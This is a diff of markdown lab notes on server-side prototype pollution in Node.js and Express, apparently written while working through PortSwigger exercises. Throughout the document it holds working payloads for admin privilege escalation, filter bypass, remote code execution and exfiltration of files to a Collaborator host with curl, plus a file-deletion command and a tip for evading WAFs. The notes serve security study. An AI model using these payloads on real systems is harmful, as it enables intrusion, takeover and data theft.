@@ -827,148 +827,484 @@ If `config` has a property named transport_url, a script element is created and 
 ```
 # Server-Side Prototype Pollution
 
+An easy trap devs fall into is overlooking the fact a JavaScript `for..in` loop iterates over all of an object's enumerable properties, including ones inherited via the prototype chain, not including built-in properties set by JavaScript's native constructors since they are non-enumerable.
 
+For example, try testing:
 
+```js
+const myObject = { a: 1, b: 2 };
 
+// pollute the prototype with an arbitrary property
+Object.prototype.foo = 'bar';
 
+// confirm myObject doesn't have its own foo property
+myObject.hasOwnProperty('foo'); // false
 
+// list names of properties of myObject
+for(const propertyKey in myObject){
+    console.log(propertyKey);
+}
 
+// Output: a, b, foo
+```
 
+It also applies to arrays where a for loop first iterates over each index, which is just a numeric property key, before moving on to any inherited properties:
 
+```js
+const myArray = ['a','b'];
+Object.prototype.foo = 'bar';
 
+for(const arrayKey in myArray){
+    console.log(arrayKey);
+}
 
+// Output: 0, 1, foo
+```
 
+If an app includes the returned properties in a response, it can provide a simple way to probe for server-side prototype pollution. 
 
+POST or PUT requests submitting JSON data to an app or API are prime candidates for this as it is common for servers to respond with a JSON representation of the new or updated object. You can attempt to pollute the global `Object.prototype` with an arbitrary property:
 
-
-
-
-
-# Server-Side Prototype Pollution - Priv Esc
-
-Identify functionality on the application where JSON data is returned in a response that appears to represent your "User" Object. An example response:
-
-```json
+```js
+POST /user/update HTTP/1.1
+Host: vulnerable-website.com
+...
 {
-"username":"test",
-"firstname":"test",
-"isAdmin":false
-}
-```
-
-Then, identify a prototype pollution source. In the request body, add a new property to the JSON with the name __proto__, containing an object with an arbitrary property. An example payload:
-
-```json
-"__proto__": {
-	"foo":"bar"
-}
-```
-
-If in the response you see the "foo" property added, without the "__proto__" property, this suggests that we may have polluted the Object's prototype and that the "foo" property has been inherited via prototype chain.
-
-Identify a gadget. The "isAdmin" property would be something to target for privilege escalation. And then craft a payload with an example being:
-
-```json
-"__proto__": {
-    "isAdmin":true
-}
-```
-
-In the response, if you see the following it suggests that the "User" object did not have its own "isAdmin“ property, and instead inherited from the polluted prototype. An example response:
-
-```json
-{
-"username":"test",
-"firstname":"test",
-"isAdmin":true
-}
-```
-
-The application may be performing some filtering on the input, one way to bypass it is by using the constructor:
-
-```json
-"constructor": {
-    "prototype": {
-        "isAdmin":true
+    "user":"wiener",
+    "firstName":"Peter",
+    "lastName":"Wiener",
+    "__proto__":{
+        "foo":"bar"
     }
 }
 ```
-# Detecting Prototype Pollution without Polluted Property Reflection
+
+If vulnerable, the injected property appears in the updated object:
+
+```js
+HTTP/1.1 200 OK
+...
+{
+    "username":"wiener",
+    "firstName":"Peter",
+    "lastName":"Wiener",
+    "foo":"bar"
+}
+```
+
+A site may use properties to dynamically generate HTML, resulting in the injected property being rendered in your browser. Once identified that server-side prototype pollution exists, look for potential gadgets to use for an exploit.
+
+>[!info]
+>Any feature involving updating user data is worth looking at since they often merging incoming data into an existing object. If you can add properties, it can lead to privilege escalation.
+
+For example, a request may be made that responds with JSON data such as:
+
+```json
+{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
+```
+
+Try adding an additional property when sending the request:
+
+```json
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lNfZLo3RtFk1owo6emrjXqC0pYm8voYR",
+"foo":"bar"}
+```
+
+Check if the property is reflected. If so, try looking for any interesting properties such as `isAdmin`. If so, try adding it to the sent request and changing the value to `true`. There may be additional security measures in place. 
+
+Try using prototype pollution by adding a new property such as:
+
+```js
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lNfZLo3RtFk1owo6emrjXqC0pYm8voYR",
+"foo":"bar",
+"__proto__": {
+"polluted": true}}
+```
+
+If the `polluted` property is returned but no `__proto__` property, it may suggest a successful pollution of the object prototype and the polluted property is inherited by the chain:
+
+![[Proto Chain.png]]
+
+>[!info]
+>The `foo` property is also still present, indicating a merging of data being sent into an existing object that represents the user.
+
+Try changing the `isAdmin` to true by polluting the prototype:
+
+```json
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lNfZLo3RtFk1owo6emrjXqC0pYm8voYR",
+"foo":"bar",
+"__proto__": {
+"isAdmin": true}}
+```
+
+![[isAdmin True.png]]
+
+This suggest the user object doesn't have its own isAdmin property, but rather inherits it from the polluted prototype. 
+
+It works because the browser is sending user information as a JSON string which is parsed on the server using `JSON.parse`. The proto property injected is likely treated as a normal property of the object meaning the object will pollute the object prototype if used with a vulnerable merge operation such as `assign()`:
+
+```js
+let myData = JSON.parse('{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lNfZLo3RtFk1owo6emrjXqC0pYm8voYR",
+"foo":"bar",
+"__proto__": {
+"isAdmin": true}}')
+
+myData
+
+let userData = Object.assign({}, myData)
+userData
+```
+
+If the server checks something like:
+
+```js
+if(userData.isAdmin){console.log('Load admin panel')}
+```
+
+The userData will have the isAdmin property inherited from the polluted object prototype:
+
+![[Load Admin.png]]
+# Server-Side Prototype Pollution without Reflection
+
+Most of the time, you will not see the affected property reflected. One approach is trying to inject properties that match potential config options and then compare the server's behaviour before and after the injection to see if the configuration change appears to have an effect.
+
+>[!info]
+>If it does, it is a strong indication of a vulnerability.
 
 There are 3 main techniques:
 
 - Status code override
 - JSON spaces override
 - Charset override
+## Status Code Overrides
+
+Frameworks like Express allow devs to set custom HTTP response codes. In case of errors, a server may issue a generic HTTP response, but include an error object in JSON format. It may even be common to receive a 200 OK response, only for the response body to contain an error object with a different status:
+
+```http
+HTTP/1.1 200 OK
+...
+{
+    "error": {
+        "success": false,
+        "status": 401,
+        "message": "You do not have permission to access this resource."
+    }
+}
+```
+
+Node `http-error` module contains a function to generate this response:
+
+```js
+function createError () {
+    //...
+    if (type === 'object' && arg instanceof Error) {
+        err = arg
+        status = err.status || err.statusCode || status
+    } else if (type === 'number' && i === 0) {
+    //...
+    if (typeof status !== 'number' ||
+    (!statuses.message[status] && (status < 400 || status >= 600))) {
+        status = 500
+    }
+    //...
+```
+
+The 5th line assigns the status variable by reading the `status` or `statusCode` property from the object passed into the function. If the devs have not set a property for the error, it can be used to probe for prototype pollution:
+
+1. Find a way to trigger an error response and take note of the default status code.
+2. Try polluting the prototype with your own status property - use an obscure status code that is unlikely to be issued for other reasons.
+3. Trigger the error response again and check for overrides.
+
+>[!danger] NodeJS
+>You must choose a status code in the `400`-`599` range. Otherwise, Node defaults to a `500` status regardless, as you can see from the second highlighted line, so you won't know whether you've polluted the prototype or not.
+>
+## JSON Spaces Override
+
+Express provides a `json spaces` option allowing the configuration of the number of spaces used to indent any JSON data in response. Devs leave this property undefined as they are happy with the default, making it vulnerable via the prototype chain.
+
+If there is access to a JSON response, try polluting the prototype with your own `json spaces` property and reissue the relevant request to see if the indentation in the JSON increases accordingly and perform the same steps to remove the indentation in order to confirm.
+
+This technique does not rely on a specific property being reflected and is safe since you are able to turn the pollution on and off by resetting the property to the same value as the default.
+
+>[!danger] Express Upgrade
+>Although it was fixed in Express 4.17.4, many sites have not upgraded.
+## Charset Override
+
+Express often implements `middleware` modules that enable preprocessing of requests before being passed to the handler function. The `body-parser` module is commonly used to parse the body of incoming requests in order to generate a `req.body` object - this contains another gadget that can be used to probe.
+
+The following code passes an options object into the `read()` function which reads the request body for parsing. One option - `encoding` - determines which character encoding to use which is either derived from the request itself via the `getCharset(req)` function call or it defaults to UTF-8:
+
+```js
+var charset = getCharset(req) or 'utf-8'
+
+function getCharset (req) {
+    try {
+        return (contentType.parse(req).parameters.charset || '').toLowerCase()
+    } catch (e) {
+        return undefined
+    }
+}
+
+read(req, res, next, parse, debug, {
+    encoding: charset,
+    inflate: inflate,
+    limit: limit,
+    verify: verify
+})
+```
+
+The devs may anticipate the `Content-Type` header may not contain an explicit `charset` attribute, meaning there is some logic that reverts to an empty string which could mean it is vulnerable.
+
+If there is an object with properties visible in a response, use it to prove for sources. For example, add an arbitrary UTF-7 encoded string to a property reflected in the response:
+
+```json
+{
+    "sessionId":"0123456789",
+    "username":"wiener",
+    "role":"+AGYAbwBv-"
+}
+```
+
+Servers won't use UTF-7 encoding by default, so it should appear in the response in encoded form. Try polluting the prototype with a `content-type` property that specifies the UTF-7 character set:
+
+```json
+{
+    "sessionId":"0123456789",
+    "username":"wiener",
+    "role":"default",
+    "__proto__":{
+        "content-type": "application/json; charset=utf-7"
+    }
+}
+```
+
+Repeat the first request and see if the string now gets decoded:
+
+```json
+{
+    "sessionId":"0123456789",
+    "username":"wiener",
+    "role":"foo"
+}
+```
+
+There is a bug in `_http_incoming` Node module that makes it work even when the request's actual `Content-Type` header includes its own charset attribute. 
+
+To avoid overwriting properties when a request contains duplicate headers, the `_addHeaderLine()` function checks no property already exists with the same key before transferring properties to an `IncomingMessage` object:
+
+```js
+IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
+function _addHeaderLine(field, value, dest) {
+    // ...
+    } else if (dest[field] === undefined) {
+        // Drop duplicates
+        dest[field] = value;
+    }
+}
+```
+
+If it does, the header being processed is effectively dropped. Due to implementation, the check includes properties inherited via the prototype chain, meaning that if you pollute the prototype with your own `content-type` property, the property representing the real header from the request is dropped.
+# Detecting Prototype Pollution without Polluted Property Reflection
+
+For example, try looking for a POST request with JSON data. The server may respond with a JSON object as well:
+
+![[POST JSON.png]]
+
+Try polluting the object prototype with a new property:
+
+![[No Reflection.png]]
+
+If no reflection, try breaking JSON syntax and observe the response:
+
+```http
+HTTP/2 500 Internal Server Error
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Etag: W/"151-iTEyRZluqY68DQzfcuX5qAlgCJ4"
+Date: Sun, 20 Oct 2024 20:00:34 GMT
+Keep-Alive: timeout=5
+X-Frame-Options: SAMEORIGIN
+Content-Length: 337
+
+{"error":{"expose":true,"statusCode":400,"status":400,"body":"{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"US\",\"sessionId\":\"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg\"\r\n\"__proto__\":{\r\n\"foo\":\"bar\"}}","type":"entity.parse.failed","foo":"bar"}}
+```
+
+There is a different code returned in the JSON from the headers. Try polluting the object prototype with a status property set to a value like 555:
+
+```json
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg"
+"__proto__": {
+    "status":555
+}}
+```
+
+Create another error and observe the response for a custom status code:
+
+```json
+{"error":{"expose":false,"statusCode":555,"status":555,"body":"{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"US\",\"sessionId\":\"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg\"\r\n\"__proto__\": {\r\n    \"status\":555\r\n}}","type":"entity.parse.failed","foo":"bar"}}
+```
+
+If successful, the object prototype is polluted, confirming the vulnerability.
+
+Another way may be JSON spaces by first observing a normal response and checking if any spaces are present. If not, try setting a `json spaces` value to 100 and observe the response:
+
+![[JSON Spaces.png]]
+
+If it changes, it confirms the vulnerability. 
+
+The final way may be via a charset override. Try encoding a certain property to UTF-7:
+
+```json
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"+AFU-+AEs-","sessionId":"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg"
+}
+```
+
+The string may appear as the same if UTF-7 is not used by default. If so, try polluting the prototype with a content-type property that sets the charset value to UTF-7:
+
+```json
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"+AFU-+AEs-","sessionId":"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg",
+"__proto__":{
+"content-type":"application/json; charset=utf-7"}
+}
+```
+# Bypass Input Filters
+
+Sites attempt to prevent prototype pollution by filtering suspicious keys like `__proto__`. The key sanitization approach is not a long-term solution since it can be bypassed such as:
+
+- Obfuscating the prohibited keywords so they are missed during sanitization.
+- Accessing the prototype via the constructor property instead of `__proto__`.
 
 >[!info]
->https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection
+>Some apps can also delete or disable `__proto__` using the command line flags `--disable-proto=delete` or `--disable-proto=throw`. It can also be bypassed by using constructor technique.
 
-First, identify prototype pollution source via the JSON spaces technique:
+For example, observe a request that sends any JSON data and returned JSON data.  Try polluting the object prototype by adding a new property to JSON with the value of an object that contains a property with the value of `true`:
 
 ```json
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"evAJIExZf87QjwbQ8jj5QkDWVWbw90MR",
 "__proto__":{
-	"json spaces":10
-}
+"polluted":true}}
 ```
 
-If the prototype pollution payload was successful, you can see a notable difference in the response, while not breaking the application's functionality. Burp Suite has an extension that can help to identify server-side prototype pollution: https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8
-# Server-Side Prototype Pollution - RCE and Exfiltration
-
-For payloads - inject these into JSON body of HTTP requests:
+If it does not get reflected, try using the `constructor` technique instead by adding a new property with a name `constructor` that has a value of an object containing a property with the name `prototype` which have the value of an object containing the polluted property with the value `true`:
 
 ```json
-"__proto__": {
-    "execArgv":[
-        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
-    ]
-}
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"evAJIExZf87QjwbQ8jj5QkDWVWbw90MR",
+"constructor":{
+"prototype":{
+"polluted":true}}}
 ```
+
+If the response contains the polluted property, but does not contain constructor or prototype, it indicates a successful pollution of the object prototype and the property is inherited via the chain. If so, try changing the `isAdmin` value to true:
 
 ```json
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"evAJIExZf87QjwbQ8jj5QkDWVWbw90MR",
+"constructor":{
+"prototype":{
+"isAdmin":true}}}
+```
+
+If it works, it means the user did not have its own `isAdmin` property, but rather inherited it from the object prototype.
+# RCE via Server-Side Prototype Pollution
+
+There are many potential sinks in Node, many of which occur in the `child_process` module. These are often invoked by a request that occurs asynchronously to the request with which you are able to pollute the prototype in the first place. 
+
+A way to identify requests is by polluting the prototype with a payload that triggers an interaction with Collaborator. 
+
+The `NODE_OPTIONS` environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. Since it is a property on the `env` object, you can control it via prototype pollution if it is undefined.
+
+Some Node functions for creating new child processes accept an optional `shell` property, allowing devs to set a specific shell, such as BASH, to run commands. Combining this with a malicious `NODE_OPTIONS` property, an attacker can pollute the prototype that causes an interaction with Collaborator whenever a new Node process is created:
+
+```js
 "__proto__": {
-    "execArgv":[
-        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
-    ]
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
 }
 ```
 
-Vim has an interactive prompt and expects the user to hit Enter to run the provided command. As a result, you need to simulate this by including a newline (\n) character at the end of your payload, as shown in the examples.
+>[!info]
+>The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames.
+
+Methods like `child_process.spawn()` and `child_process.fork()` enables devs to create new Node subprocesses. The `fork()` method accepts an options object in which one of the potential options is the `execArgv` property.
+
+This is an array of strings containing command-line arguments that should be used when spawning the child process. If it is left undefined, it can potentially be controlled via prototype pollution.
+
+Since the gadget lets you control the command line arguments, this gives you access to some attack vectors that would not be possible using `NODE_OPTIONS`, including options like `--eval` which enables you to pass in arbitrary JavaScript that is executed by the child processL
+
+```js
+"execArgv": [
+    "--eval=require('<module>')"
+]
+```
+
+In addition, the `child_process` module contains the `execSync()` method which executes a string as a system command. By chaining the JavaScript and command injection sinks, you can escalate prototype pollution to gain full RCE.
+
+For example, there may be an option to run maintenance jobs as an admin which may clear the database and file system by sending JSON data. There may also be a request to change user data via sending JSON data and it may reflect changes:
+
+![[Change Email.png]]
+
+Try using "Server-Side Prototype Pollution" extension by sending the request to the extension. If exploitable, it may report sources found in the Issues tab:
+
+![[Issue.png]]
+
+If confirmed, check the maintenance jobs functionality. Functionality like this can spawn node child processes. There are many sinks that occur in the child process module like spawn, exec and execFile. [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce) includes some interesting payloads.
+
+Try using an example:
+
+```js
+b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
+b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
+```
+
+And adding a new object containing two properties:
+
+-  env - an object containing an `evil` property with a value of a cURL request to Collaborator
+- NODE_OPTIONS  - contains a value
+
+```json
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lTZhtiAQ2Pt6mw4ZlQ8IjZcrdngL1dgE",
+"__proto__":{
+"env":{
+"evil":"require('child_process').execSync('curl 8t2t4ushprz3hh7pym2xoi6bb2ht5jt8.oastify.com').toString())//"},
+"NODE_OPTIONS":"--require /proc/self/environ"}}
+```
+
+![[ENV.png]]
+
+This loads the environment module to access environment variables set on the server. The `env` property is usually used to store environment variables. Within `env` object, a new property is made that loads a child process module and calls the execSync function on it to execute a command.
+
+If successful, the injected properties get reflected. Try running the cleanup jobs, which may spawn a new child process that can get polluted with the injected properties and execute a cURL request to Collaborator:
+
+```json
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lTZhtiAQ2Pt6mw4ZlQ8IjZcrdngL1dgE",
+"__proto__":{
+"env":{
+"evil":"require('child_process').execSync('curl 8t2t4ushprz3hh7pym2xoi6bb2ht5jt8.oastify.com')//"},
+"NODE_OPTIONS":"--require /proc/self/environ"}}
+```
+# RCE via child_process.execSync()
+
+In some cases, the app may invoke this method on its own. The `execSync()` method also accepts options object, which may be pollutable via the prototype chain. Although it does not accept an `execArgv` property, you can still inject system commands into a running process by simultaneously polluting the `shell` and `input` properties:
+
+- The `input` option is a string passed to the child processes `stdin` stream and executed as a system command by `execSync()`. Since there are other options for providing the command, such as simply passing it as an argument to the function, the `input` property itself may be left undefined.
+- The `shell` option lets devs declare a specific shell in which they want the command to run. By default, it uses the system's default shell to run commands, so it may also be left undefined
+
+By polluting both properties, you can override the command that the app devs intended to execute and instead run a malicious command in a shell of your choosing. There are a few caveats:
+
+- The `shell` option only accepts the name of the shells executable and does not allow you to set any additional command line arguments.
+- The shell is always executed with the `-c` argument, which most shells use to let you pass in a command as a string. However, setting the `-c` flag in Node instead runs a syntax check on the script, which also prevents it from executing. It is generally tricky to use Node itself as a shell for your attack.
+- As the `input` property containing the payload is passed via `stdin`, the shell must accept commands from `stdin`.
+
+Text editors like Vim and ex reliably fulfill all of these criteria. If either of them happen to be installed, this creates a potential vector for RCE:
 
 ```json
 "shell":"vim",
 "input":":! <command>\n"
 ```
 
-```json
-"__proto__": {
-    "shell":"vim",
-    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
-}
-```
+>[!info]
+>Vim has an interactive prompt and expects the user to hit Enter to run the provided command. As a result, you must simulate this by including a newline `\n` character at the end of the payload.
 
-To exfiltrate data to Burp Collaborator:
+One additional limitation of this technique is that some tools you may want to use don't read data from `stdin` by default. However, there are a few ways around it. For example, `curl` can still read `stdin` and send the contents as the body of a POST request using the `-d @-` argument.
 
-```json
-"__proto__": {
-    "shell":"vim",
-    "input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
-}
-```
-
-```json
-"__proto__": {
-    "shell":"vim",
-    "input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
-}
-```
-
-The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames.
-
-```json
-"__proto__": {
-    "shell":"node",
-    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
-}
-```
+In other cases, you can use `xargs` which converts `stdin` to a list of arguments that can be passed to a command.
 
